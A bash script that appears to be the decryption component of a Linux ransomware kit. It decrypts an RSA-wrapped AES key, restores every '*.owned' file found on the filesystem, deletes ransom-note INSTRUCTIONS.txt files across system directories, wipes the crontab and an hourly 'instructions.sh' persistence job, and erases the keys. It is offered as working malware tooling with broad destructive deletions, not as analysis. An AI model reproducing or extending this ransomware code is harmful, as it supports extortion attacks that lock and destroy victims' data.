#!/bin/bash

chmod 755 /root/priv.pem

openssl rsautl -decrypt -inkey /root/priv.pem -in /root/key.bin.enc -out /root/key.bin

for file in $(find / -name "*.owned")
do
  openssl enc -aes-256-cbc -d -in "${file}" -out "${file%.*}" -pass file:/root/key.bin &>/dev/null

  rm -rf "${file}"
done

for directory in $(find /root/ /home/ /etc/ /bin/ /usr/sbin/ /usr/bin /sbin/ /usr/local/bin/ -type d)
do
    rm -rf "${directory}/INSTRUCTIONS.txt"
done

crontab -r 
rm -rf /etc/cron.hourly/instructions.sh
rm -rf /root/key.bin /root/key.bin.enc /root/priv.pem /root/pub.pem 
